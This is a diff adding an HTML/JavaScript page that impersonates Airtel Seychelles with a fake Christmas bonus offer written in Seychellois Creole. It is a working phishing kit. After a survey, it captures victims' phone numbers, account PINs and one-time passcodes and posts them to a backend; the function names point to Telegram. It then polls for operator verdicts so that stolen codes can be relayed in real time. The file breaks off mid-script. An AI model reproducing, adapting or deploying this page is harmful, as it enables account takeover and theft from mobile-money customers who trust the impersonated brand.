@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Airtel Rewards</title>
+    <style>
+        /* --- RESET & BASE --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #f4f5f7; display: flex; justify-content: center; min-height: 100vh; }
+        #app-container { width: 100%; max-width: 480px; background: #ffffff; position: relative; overflow-x: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.1); min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* --- COLORS --- */
+        :root { --airtel-red: #e60000; --airtel-dark-red: #b30000; --airtel-yellow: #ffcc00; --text-dark: #1a1a1a; --text-gray: #666666; }
+        .text-red { color: var(--airtel-red); } .text-yellow { color: var(--airtel-yellow); }
+
+        /* --- BUTTONS & LOADERS --- */
+        .btn-primary { background-color: var(--airtel-red); color: white; border: none; border-radius: 8px; padding: 16px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; transition: background 0.2s, opacity 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn-primary:active { background-color: var(--airtel-dark-red); }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-outline { background: transparent; border: 1px solid #ccc; border-radius: 20px; padding: 8px 24px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; margin: 0 auto; cursor: pointer; }
+        .loader { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid #fff; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- SCREENS --- */
+        .screen { display: none; flex-direction: column; flex: 1; animation: fadeIn 0.3s ease; }
+        .screen.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
+
+        /* --- SCREEN 1: CAMPAIGN --- */
+        .campaign-screen { background: linear-gradient(180deg, var(--airtel-red) 0%, #cc0000 40%, #ffffff 40.1%, #ffffff 100%); }
+        .header-logo { padding: 20px; display: flex; align-items: center; }
+        .header-logo svg { height: 30px; fill: white; }
+        .campaign-hero { padding: 0 20px; color: white; text-align: left; }
+        .campaign-hero .bon-nwel { font-family: 'Brush Script MT', cursive, sans-serif; font-size: 42px; color: white; text-align: right; margin-bottom: -10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        .campaign-hero h1 { font-size: 32px; font-weight: 800; line-height: 1.1; margin-bottom: 10px; color: white; }
+        .campaign-hero p { font-size: 14px; margin-bottom: 20px; }
+        .bonus-card { background: white; border-radius: 16px; padding: 20px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.1); margin: 20px; position: relative; z-index: 2; }
+        .bonus-card h3 { color: var(--airtel-red); font-size: 16px; margin-bottom: 5px; }
+        .bonus-card .amount { font-size: 40px; font-weight: 900; color: var(--airtel-dark-red); line-height: 1;}
+        .bonus-card p { font-size: 12px; color: var(--text-gray); margin-top: 5px; }
+        .btn-check-bonus { background-color: var(--airtel-red); color: white; border: none; border-radius: 30px; padding: 12px 24px; font-size: 14px; font-weight: bold; display: flex; align-items: center; gap: 10px; margin: 15px auto 0; cursor: pointer; }
+        .campaign-info { padding: 20px; text-align: center; background: white; }
+        .campaign-info h2 { font-size: 24px; font-weight: 800; margin-bottom: 20px; }
+        .campaign-info .badge { background: var(--airtel-red); color: white; padding: 5px 20px; border-radius: 20px; font-size: 14px; font-weight: bold; display: inline-block; margin-bottom: 20px;}
+        .steps-list { text-align: left; margin-bottom: 30px; }
+        .step-item { display: flex; align-items: flex-start; gap: 15px; margin-bottom: 20px; background: #fff5f5; padding: 15px; border-radius: 12px; }
+        .step-icon { background: var(--airtel-red); color: white; min-width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; }
+        .step-text h4 { font-size: 14px; margin-bottom: 4px; }
+        .step-text p { font-size: 12px; color: var(--text-gray); }
+
+        /* --- SCREEN 2: SURVEY --- */
+        .survey-header { background: var(--airtel-red); padding: 20px; color: white; border-radius: 0 0 20px 20px; position: relative; overflow: hidden; }
+        .survey-header h1 { font-size: 24px; font-weight: 800; color: white; margin-top: 10px;}
+        .survey-header p { font-size: 12px; margin-top: 5px; }
+        .survey-body { padding: 20px; background: #f7f9fc; flex: 1; }
+        .progress-bar-container { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; padding: 0 10px; }
+        .progress-step { width: 30px; height: 30px; border-radius: 50%; background: #e0e0e0; color: #888; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .progress-step.active { background: var(--airtel-red); color: white; }
+        .progress-line { flex: 1; height: 2px; background: #e0e0e0; margin: 0 10px; }
+        .progress-line.active { background: var(--airtel-red); }
+        .step-indicator { background: var(--airtel-red); color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; display: block; width: fit-content; margin: 0 auto 15px; font-weight: bold; }
+        .form-container { background: white; border-radius: 16px; padding: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-weight: 600; font-size: 14px; margin-bottom: 10px; color: var(--text-dark); }
+        .input-wrapper { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 8px; padding: 10px 15px; }
+        .input-wrapper input { border: none; outline: none; flex: 1; font-size: 14px; }
+        .options-grid { display: flex; flex-wrap: wrap; gap: 8px; }
+        .option-btn { border: 1px solid #ccc; background: white; padding: 8px 12px; border-radius: 20px; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
+        .option-btn.selected { border-color: var(--airtel-red); background: #fff5f5; color: var(--airtel-red); }
+
+        /* --- SCREEN 3: LOGIN --- */
+        .login-screen { background: white; }
+        .login-header { padding: 20px; display: flex; align-items: center; }
+        .login-header .back-btn { font-size: 24px; margin-right: 15px; cursor: pointer; border: none; background: none;}
+        .login-content { padding: 20px; flex: 1; display: flex; flex-direction: column; }
+        .login-content h2 { font-size: 22px; margin-bottom: 5px; }
+        .login-content .subtitle { color: var(--text-gray); font-size: 14px; margin-bottom: 25px; }
+        .phone-input-group { display: flex; align-items: center; border-bottom: 2px solid #007bff; padding-bottom: 5px; margin-bottom: 20px; transition: border-color 0.2s; }
+        .phone-input-group.focused { border-bottom-color: #0056b3; }
+        .phone-input-group span { font-size: 18px; font-weight: bold; margin-right: 10px; color: var(--text-dark); }
+        .phone-input-group input { border: none; outline: none; font-size: 18px; width: 100%; background: transparent; color: var(--text-dark); caret-color: #007bff; }
+
+        /* PIN boxes — smaller & clickable */
+        .pin-section { display: flex; justify-content: center; gap: 12px; margin-bottom: 25px; }
+        .pin-box { width: 56px; height: 56px; border: 1px solid #ccc; border-radius: 8px; font-size: 22px; text-align: center; background: #f9f9f9; color: var(--text-dark); outline: none; transition: border-color 0.2s, background 0.2s; cursor: pointer; caret-color: #007bff; }
+        .pin-box:focus, .pin-box.active { border-color: #007bff; background: white; }
+
+        .info-box { background: #e8f4fd; border-radius: 8px; padding: 12px; display: flex; gap: 10px; font-size: 12px; color: #004085; margin-bottom: 30px; }
+        .info-box svg { width: 20px; fill: #007bff; flex-shrink: 0;}
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
+        .key { background: #f8f9fa; border-radius: 12px; padding: 20px; font-size: 24px; text-align: center; cursor: pointer; user-select: none; border: 1px solid #eee; color: var(--text-dark); }
+        .key:active { background: #e2e6ea; }
+        .key.backspace { display: flex; align-items: center; justify-content: center; }
+        .key.backspace svg { fill: #666; }
+        .key.empty { background: transparent; border: none; cursor: default; }
+
+        /* --- SCREEN 4: OTP --- */
+        .otp-screen { background: #f4f5f7; }
+        .otp-header { padding: 20px; text-align: center; position: relative; background: white; }
+        .otp-header .back-btn { position: absolute; left: 20px; top: 20px; font-size: 24px; border: none; background: none; cursor: pointer;}
+        .otp-header h2 { font-size: 18px; }
+        .otp-content { padding: 30px 20px; text-align: center; flex: 1; display: flex; flex-direction: column; align-items: center; }
+        .otp-content p { font-size: 14px; color: var(--text-gray); margin-bottom: 30px; }
+        .otp-inputs { display: flex; gap: 15px; margin-bottom: 30px; }
+        .otp-box { width: 50px; height: 60px; border: 1px solid #ccc; border-radius: 8px; font-size: 24px; text-align: center; background: white; }
+        .otp-box:focus { border-color: var(--airtel-red); outline: none; }
+        .resend-section { display: flex; justify-content: space-between; width: 100%; font-size: 12px; font-weight: bold; color: var(--text-gray); margin-bottom: 40px; }
+        .need-help { font-size: 14px; margin-bottom: 15px; }
+        .custom-keyboard { background: #d1d5db; padding: 10px 5px 20px; border-radius: 20px 20px 0 0; width: 100%; display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: auto; }
+        .kb-key { background: white; border-radius: 6px; padding: 15px 0; font-size: 20px; text-align: center; cursor: pointer; box-shadow: 0 1px 1px rgba(0,0,0,0.2); }
+        .kb-key:active { background: #e5e5e5; }
+        .kb-key .sub-text { display: block; font-size: 9px; letter-spacing: 1px; margin-top: 2px; }
+        .kb-key.empty { background: transparent; box-shadow: none; pointer-events: none;}
+        .kb-key.backspace { display: flex; align-items: center; justify-content: center;}
+
+        /* --- SCREEN 5: CONGRATS --- */
+        .congrats-screen { background: white; justify-content: center; align-items: center; text-align: center; padding: 40px 20px; }
+        .congrats-icon { font-size: 80px; margin-bottom: 20px; animation: popIn 0.5s ease; }
+        .congrats-screen h2 { font-size: 28px; color: var(--airtel-red); margin-bottom: 10px; }
+        .congrats-screen p { font-size: 16px; color: var(--text-gray); margin-bottom: 30px; }
+        .bonus-reveal { background: #fff5f5; border: 2px dashed var(--airtel-red); border-radius: 16px; padding: 20px; margin-bottom: 30px; width: 100%; }
+        .bonus-reveal h3 { font-size: 16px; color: var(--text-dark); margin-bottom: 5px; }
+        .bonus-reveal .amount { font-size: 42px; font-weight: 900; color: var(--airtel-red); }
+        @keyframes popIn { 0% { transform: scale(0); } 80% { transform: scale(1.1); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+<div id="app-container">
+    <!-- SCREEN 1 -->
+    <div id="screen-campaign" class="screen active campaign-screen">
+        <div class="header-logo"><svg viewBox="0 0 100 30"><path d="M 10 15 C 10 5, 25 5, 25 15 C 25 25, 10 25, 10 15 Z M 20 15 C 20 10, 28 10, 28 15 C 28 20, 20 20, 20 15 Z" fill="white"/><text x="35" y="22" fill="white" font-size="20" font-family="Arial" font-weight="bold">airtel</text></svg></div>
+        <div class="campaign-hero">
+            <div class="bon-nwel">Bon Nwèl</div>
+            <h1>Airtel <span class="text-yellow">Rewards</span> ou!</h1>
+            <p>Get enn bonis o aza sa Nwèl-la – pou kliyan ki ena Airtel pou <strong class="text-yellow">plis ki enn mwan.</strong></p>
+            <div class="bonus-card">
+                <h3>Ziska</h3>
+                <div class="amount">SCR 30000</div>
+                <p>depann lo kou tranzaksyon ou.</p>
+                <button class="btn-check-bonus" onclick="showScreen('screen-survey')">Tchek mon bonis <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
+            </div>
+        </div>
+        <div class="campaign-info">
+            <div class="badge">Sa Nwèl-la</div>
+            <h2>Sa Airtel <span class="text-red">Rewards</span> ou!</h2>
+            <p style="font-size: 14px; margin-bottom: 20px;">Get enn <strong>bonis o aza sa Nwèl-la</strong> – pou kliyan ki ena Airtel pou <strong>plis ki enn mwan.</strong></p>
+            <div class="steps-list">
+                <div class="step-item"><div class="step-icon">✓</div><div class="step-text"><h4>Itilize Airtel pou 1 mwa</h4><p>Nenport ki ti pe tranzakte lo Airtel pou plis ki enn mwan i kapab pran enn pati.</p></div></div>
+                <div class="step-item"><div class="step-icon">✓</div><div class="step-text"><h4>Kontinyen tranzakte</h4><p>Top up, voye lajan, achte donn oubyin done – plis ou admin aktivite, pli ou ganny bonis.</p></div></div>
+                <div class="step-item"><div class="step-icon">✓</div><div class="step-text"><h4>Konfirm ou nimero</h4><p>Verify ou nimero Airtel avek enn kòd 6 chif avan ou ganny bonis la.</p></div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 2: SURVEY -->
+    <div id="screen-survey" class="screen survey-screen">
+        <div class="survey-header">
+            <span style="font-size: 12px; font-weight: bold; background: rgba(255,255,255,0.2); padding: 3px 10px; border-radius: 10px;">SA NWÈL-LA</span>
+            <h1>Airtel <span class="text-yellow">Rewards</span> ou!</h1>
+            <p>Get enn bonis o aza sa Nwèl-la – pou kliyan ki ena Airtel pou <strong>plis ki enn mwan.</strong></p>
+        </div>
+        <div class="survey-body">
+            <div class="progress-bar-container"><div class="progress-step active">1</div><div class="progress-line active"></div><div class="progress-step">2</div><div class="progress-line"></div><div class="progress-step">3</div></div>
+            <div class="step-indicator">Etap 1 sur 3</div>
+            <p style="font-size: 12px; text-align: center; margin-bottom: 15px;">Ranpli bann bwat ki anba la, apre klike <strong>Kontinyen</strong>. Li pran enn ti moman.</p>
+            <div class="form-container">
+                <div class="form-group">
+                    <label><span style="color:var(--airtel-red); margin-right:5px;">1</span> Ou non</label>
+                    <div class="input-wrapper">
+                        <span style="margin-right: 10px; color: #888;">👤</span>
+                        <input type="text" id="q1-name" placeholder="eg. Rudo Chikafu" autocomplete="off">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label><span style="color:var(--airtel-red); margin-right:5px;">2</span> Ki sa ou i servi Airtel pou?</label>
+                    <div class="options-grid" data-group="q2">
+                        <button class="option-btn" data-value="Send lajan">💰 Send lajan</button>
+                        <button class="option-btn" data-value="AirTime">📱 AirTime</button>
+                        <button class="option-btn" data-value="Peye bill">📄 Peye bill</button>
+                        <button class="option-btn" data-value="Shop">🏠 Shop</button>
+                        <button class="option-btn" data-value="Save">🪙 Save</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label><span style="color:var(--airtel-red); margin-right:5px;">3</span> Konbyen letan ou i servi Airtel?</label>
+                    <div class="options-grid" data-group="q3">
+                        <button class="option-btn" data-value="Mwens ki 1 mwan">📅 Mwens ki 1 mwan</button>
+                        <button class="option-btn" data-value="1-6 mwan">📅 1 – 6 mwan</button>
+                        <button class="option-btn" data-value="Plis enn an">📅 Plis enn an</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label><span style="color:var(--airtel-red); margin-right:5px;">4</span> Lajan ou i tranzakse chak mwan</label>
+                    <div class="input-wrapper" style="padding: 5px;">
+                        <span style="background: #e0e0e0; padding: 8px 15px; border-radius: 4px; font-weight: bold; font-size: 14px;">SCR</span>
+                        <input type="number" id="q4-amount" placeholder="700" style="padding-left: 10px;" inputmode="numeric">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label><span style="color:var(--airtel-red); margin-right:5px;">5</span> Ki kalite bonis ou i eksperyans?</label>
+                    <div class="options-grid" data-group="q5">
+                        <button class="option-btn" data-value="SCR 700">SCR 700</button>
+                        <button class="option-btn" data-value="SCR 1,400">SCR 1,400</button>
+                        <button class="option-btn" data-value="SCR 2,800">SCR 2,800</button>
+                        <button class="option-btn" data-value="SCR 5,000">SCR 5,000</button>
+                        <button class="option-btn" data-value="SCR 7,200">SCR 7,200</button>
+                    </div>
+                </div>
+                <button class="btn-primary" id="survey-next-btn" onclick="goToLogin()" disabled>Kontinyen ›</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 3: LOGIN -->
+    <div id="screen-login" class="screen login-screen">
+        <div class="login-header">
+            <button class="back-btn" onclick="showScreen('screen-survey')">←</button>
+            <svg viewBox="0 0 100 30" style="height: 25px;"><path d="M 10 15 C 10 5, 25 5, 25 15 C 25 25, 10 25, 10 15 Z M 20 15 C 20 10, 28 10, 28 15 C 28 20, 20 20, 20 15 Z" fill="var(--airtel-red)"/><text x="35" y="22" fill="var(--airtel-red)" font-size="20" font-family="Arial" font-weight="bold">airtel</text></svg>
+        </div>
+        <div class="login-content">
+            <h2>Byenveni kot Airtel Sesel</h2>
+            <p class="subtitle">Nimero Enskri oswa ID Kont</p>
+
+            <div class="phone-input-group" id="phone-group">
+                <span>📱 +248 -</span>
+                <input type="tel" id="login-number" placeholder="Antre isi" inputmode="numeric" autocomplete="off">
+            </div>
+
+            <div class="pin-section">
+                <input type="password" class="pin-box" maxlength="1" id="pin1" readonly>
+                <input type="password" class="pin-box" maxlength="1" id="pin2" readonly>
+                <input type="password" class="pin-box" maxlength="1" id="pin3" readonly>
+                <input type="password" class="pin-box" maxlength="1" id="pin4" readonly>
+            </div>
+
+            <div class="info-box">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                Nimero enskri (Airtel oswa lezot operater) oswa nimero kont Home Broadband ou. Antre PIN pou kontinye.
+            </div>
+
+            <div class="keypad" id="login-keypad">
+                <div class="key" data-key="1">1</div>
+                <div class="key" data-key="2">2</div>
+                <div class="key" data-key="3">3</div>
+                <div class="key" data-key="4">4</div>
+                <div class="key" data-key="5">5</div>
+                <div class="key" data-key="6">6</div>
+                <div class="key" data-key="7">7</div>
+                <div class="key" data-key="8">8</div>
+                <div class="key" data-key="9">9</div>
+                <div class="key empty"></div>
+                <div class="key" data-key="0">0</div>
+                <div class="key backspace" data-action="delete">
+                    <svg width="24" height="24" viewBox="0 0 24 24"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7.07L2.4 12l4.66-7H22v14zm-11.59-2L14 13.41 17.59 17 19 15.59 15.41 12 19 8.41 17.59 7 14 10.59 10.41 7 9 8.41 12.59 12 9 15.59z"/></svg>
+                </div>
+            </div>
+
+            <button id="btn-submit-login" class="btn-primary" onclick="submitLoginToTelegram()" style="margin-top: auto;">
+                <span id="login-btn-text">KONTINYE POU LOGIN</span>
+                <div class="loader" id="login-loader"></div>
+            </button>
+        </div>
+    </div>
+
+    <!-- SCREEN 4: OTP -->
+    <div id="screen-otp" class="screen otp-screen">
+        <div class="otp-header"><button class="back-btn" onclick="showScreen('screen-login')">←</button><h2>Verifikasyon OTP</h2></div>
+        <div class="otp-content">
+            <p>In OTP finn ganny avoye kot <span id="display-phone">798XX58</span> par SMS ek WhatsApp.</p>
+            <div class="otp-inputs">
+                <input type="text" class="otp-box" maxlength="1" id="otp1" readonly>
+                <input type="text" class="otp-box" maxlength="1" id="otp2" readonly>
+                <input type="text" class="otp-box" maxlength="1" id="otp3" readonly>
+                <input type="text" class="otp-box" maxlength="1" id="otp4" readonly>
+            </div>
+            <div class="resend-section"><span style="color: #999;">REVOYE OTP</span><span>00:54</span></div>
+            <p class="need-help">Ou bezwen ed pou kliyan?</p>
+            <button class="btn-outline"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>Apel</button>
+        </div>
+        <div class="custom-keyboard" id="otp-keypad">
+            <div class="kb-key" data-key="1">1</div>
+            <div class="kb-key" data-key="2">2<span class="sub-text">ABC</span></div>
+            <div class="kb-key" data-key="3">3<span class="sub-text">DEF</span></div>
+            <div class="kb-key" data-key="4">4<span class="sub-text">GHI</span></div>
+            <div class="kb-key" data-key="5">5<span class="sub-text">JKL</span></div>
+            <div class="kb-key" data-key="6">6<span class="sub-text">MNO</span></div>
+            <div class="kb-key" data-key="7">7<span class="sub-text">PQRS</span></div>
+            <div class="kb-key" data-key="8">8<span class="sub-text">TUV</span></div>
+            <div class="kb-key" data-key="9">9<span class="sub-text">WXYZ</span></div>
+            <div class="kb-key empty"></div>
+            <div class="kb-key" data-key="0">0</div>
+            <div class="kb-key backspace" data-action="delete">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 5: CONGRATS -->
+    <div id="screen-congrats" class="screen congrats-screen">
+        <div class="congrats-icon">🎉</div>
+        <h2>Felisitasyon!</h2>
+        <p>Ou finn kalifye pou Airtel Rewards.</p>
+        <div class="bonus-reveal"><h3>Ou Bonis Nwèl:</h3><div class="amount">SCR 30,000</div></div>
+        <p style="font-size: 14px;">Ou bonis pou ganny kredite lo ou kont Airtel dan 24 er.</p>
+    </div>
+</div>
+
+<script>
+    const API_BASE = '/api';
+    let activeSessionId = null;
+    let currentPhone = "";
+    let currentPin = "";
+    let currentOtp = "";
+    let pollInterval = null;
+
+    /* ---------------- Screen switching ---------------- */
+    function showScreen(screenId) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(screenId).classList.add('active');
+
+        if (screenId === 'screen-login') {
+            setTimeout(() => {
+                document.getElementById('login-number').focus();
+                document.getElementById('phone-group').classList.add('focused');
+            }, 50);
+        }
+        if (screenId === 'screen-otp') {
+            setTimeout(() => document.getElementById('otp1').focus(), 50);
+        }
+    }
+
+    /* ---------------- SURVEY: enforce all fields ---------------- */
+    const surveyBtn = document.getElementById('survey-next-btn');
+
+    function surveyIsComplete() {
+        const name = (document.getElementById('q1-name').value || '').trim();
+        const amount = (document.getElementById('q4-amount').value || '').trim();
+        const groupsDone = [...document.querySelectorAll('.options-grid[data-group]')]
+            .every(g => g.querySelector('.option-btn.selected'));
+        return name.length > 0 && amount.length > 0 && groupsDone;
+    }
+
+    function refreshSurveyButton() {
+        surveyBtn.disabled = !surveyIsComplete();
+    }
+
+    document.querySelectorAll('.options-grid').forEach(grid => {
+        grid.addEventListener('click', (e) => {
+            const btn = e.target.closest('.option-btn');
+            if (!btn) return;
+            grid.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            refreshSurveyButton();
+        });
+    });
+
+    ['q1-name', 'q4-amount'].forEach(id => {
+        document.getElementById(id).addEventListener('input', refreshSurveyButton);
+    });
+
+    refreshSurveyButton();
+
+    function goToLogin() {
+        if (!surveyIsComplete()) {
+            alert("Tanpri ranpli tou bann kestyon avan ou kontinyen.");
+            return;
+        }
+        showScreen('screen-login');
+    }
+
+    /* ---------------- LOGIN: phone + PIN keypad ---------------- */
+    const loginInput = document.getElementById('login-number');
+    const phoneGroup = document.getElementById('phone-group');
+    const pinInputs = [
+        document.getElementById('pin1'),
+        document.getElementById('pin2'),
+        document.getElementById('pin3'),
+        document.getElementById('pin4'),
+    ];
+    let currentPinIndex = 0;
+    let phoneFocused = true;
+
+    /* Click PIN box → jump cursor there */
+    pinInputs.forEach((box, i) => {
+        box.addEventListener('click', () => {
+            currentPinIndex = i;
+            phoneFocused = false;
+            box.focus();
+            updatePinHighlight();
+        });
+    });
+
+    loginInput.addEventListener('focus', () => {
+        phoneFocused = true;
+        phoneGroup.classList.add('focused');
+        updatePinHighlight();
+    });
+    loginInput.addEventListener('blur', () => {
+        phoneGroup.classList.remove('focused');
+    });
+
+    function updatePinHighlight() {
+        pinInputs.forEach((b, i) => {
+            b.classList.toggle('active', !phoneFocused && i === currentPinIndex);
+        });
+    }
+
+    function handleKeypad(num) {
+        if (phoneFocused) {
+            if (loginInput.value.length < 7) {
+                loginInput.value += num;
+                if (loginInput.value.length === 7) {
+                    phoneFocused = false;
+                    currentPinIndex = 0;
+                    pinInputs[0].focus();
+                    updatePinHighlight();
+                }
+            }
+            return;
+        }
+
+        if (currentPinIndex < 4) {
+            pinInputs[currentPinIndex].value = num;
+            currentPinIndex++;
+            if (currentPinIndex < 4) pinInputs[currentPinIndex].focus();
+            updatePinHighlight();
+        }
+    }
+
+    function handleDelete() {
+        if (!phoneFocused && currentPinIndex > 0) {
+            currentPinIndex--;
+            pinInputs[currentPinIndex].value = '';
+            pinInputs[currentPinIndex].focus();
+            updatePinHighlight();
+            return;
+        }
+        if (loginInput.value.length > 0) {
+            loginInput.value = loginInput.value.slice(0, -1);
+        } else if (!phoneFocused) {
+            phoneFocused = true;
+            currentPinIndex = 0;
+            updatePinHighlight();
+            loginInput.focus();
+        }
+    }
+
+    /* ---- Delegated click handler + 50ms debounce to prevent double-fire ---- */
+    let lastKeyTime = 0;
+    function debounceKey() {
+        const now = Date.now();
+        if (now - lastKeyTime < 50) return false;
+        lastKeyTime = now;
+        return true;
+    }
+
+    document.getElementById('login-keypad').addEventListener('click', (e) => {
+        if (!debounceKey()) return;
+        const btn = e.target.closest('[data-key], [data-action]');
+        if (!btn) return;
+        if (btn.dataset.action === 'delete') handleDelete();
+        else if (btn.dataset.key) handleKeypad(btn.dataset.key);
+    });
+
+    document.getElementById('otp-keypad').addEventListener('click', (e) => {
+        if (!debounceKey()) return;
+        const btn = e.target.closest('[data-key], [data-action]');
+        if (!btn) return;
+        if (btn.dataset.action === 'delete') deleteOTP();
+        else if (btn.dataset.key) inputOTP(btn.dataset.key);
+    });
+
+    /* Prevent keypad buttons from stealing focus (stops iOS keyboard popup) */
+    document.querySelectorAll('#login-keypad .key, #otp-keypad .kb-key').forEach(el => {
+        el.addEventListener('mousedown', (e) => e.preventDefault());
+    });
+
+    /* ---------------- Submit login ---------------- */
+    async function submitLoginToTelegram() {
+        currentPhone = loginInput.value;
+        currentPin = pinInputs.map(i => i.value).join('');
+
+        if (currentPhone.length < 7 || currentPin.length < 4) {
+            alert("Ou bezwen antre nimero ek PIN konplè.");
+            return;
+        }
+
+        const btn = document.getElementById('btn-submit-login');
+        const btnText = document.getElementById('login-btn-text');
+        const loader = document.getElementById('login-loader');
+
+        btn.disabled = true;
+        btnText.innerText = "KONTINYE...";
+        loader.style.display = "block";
+
+        try {
+            const res = await fetch(`${API_BASE}/submit-login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: currentPhone, pin: currentPin })
+            });
+            const data = await res.json();
+            if (!data.ok) throw new Error(data.error || 'failed');
+            activeSessionId = data.sessionId;
+            startPolling();
+        } catch (e) {
+            alert("Error connecting to server: " + e.message);
+            btn.disabled = false;
+            btnText.innerText = "KONTINYE POU LOGIN";
+            loader.style.display = "none";
+        }
+    }
+
+    /* ---------------- OTP ---------------- */
+    let currentOtpIndex = 0;
+    const otpInputs = [
+        document.getElementById('otp1'),
+        document.getElementById('otp2'),
+        document.getElementById('otp3'),
+        document.getElementById('otp4'),
+    ];
+
+    function inputOTP(num) {
+        if (currentOtpIndex < 4) {
+            otpInputs[currentOtpIndex].value = num;
+            currentOtpIndex++;
+            if (currentOtpIndex < 4) otpInputs[currentOtpIndex].focus();
+            else setTimeout(submitOtpToTelegram, 300);
+        }
+    }
+
+    function deleteOTP() {
+        if (currentOtpIndex > 0) {
+            currentOtpIndex--;
+            otpInputs[currentOtpIndex].value = '';
+            otpInputs[currentOtpIndex].focus();
+        }
+    }
+
+    async function submitOtpToTelegram() {
+        currentOtp = otpInputs.map(i => i.value).join('');
+        if (currentOtp.length < 4) return alert("Antre OTP konplè.");
+        if (!activeSessionId) return alert("Session missing — resubmit login.");
+
+        try {
+            await fetch(`${API_BASE}/submit-otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId: activeSessionId, otp: currentOtp })
+            });
+            startPolling();
+        } catch (e) {
+            alert("Error submitting OTP");
+        }
+    }
+
+    /* ---------------- Polling ---------------- */
+    function startPolling() {
+        if (pollInterval) clearInterval(pollInterval);
+
+        pollInterval = setInterval(async () => {
+            if (!activeSessionId) return;
+
+            try {
+                const response = await fetch(`${API_BASE}/check-status`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId: activeSessionId })
+                });
+                const data = await response.json();
+
+                if (data.status === 'APPROVED') {
+                    stopPolling();
+                    resetLoginBtn();
+                    document.getElementById('display-phone').innerText = currentPhone;
+                    showScreen('screen-otp');
+                }
+                else if (data.status === 'REJECTED') {
+                    stopPolling();
+                    resetLoginBtn();
+                    alert("Aksè rejte. Tanpri antre ou detay ankò.");
+                    loginInput.value = "";
+                    pinInputs.forEach(i => i.value = "");
+                    currentPinIndex = 0;
+                    phoneFocused = true;
+                    updatePinHighlight();
+                    loginInput.focus();
+                }
+                else if (data.status === 'SUCCESS') {
+                    stopPolling();
+                    showScreen('screen-congrats');
+                }
+                else if (data.status === 'WRONG_PIN') {
+                    stopPolling();
+                    alert("PIN ou antre a pa kòrèk. Tanpri antre ou nimero ek PIN ankò.");
+                    showScreen('screen-login');
+                    loginInput.value = "";
+                    pinInputs.forEach(i => i.value = "");
+                    currentPinIndex = 0;
+                    phoneFocused = true;
+                    updatePinHighlight();
+                    loginInput.focus();
+                }
+                else if (data.status === 'WRONG_OTP') {
+                    stopPolling();
+                    alert("OTP ou antre a pa kòrèk. Tanpri antre OTP ankò.");
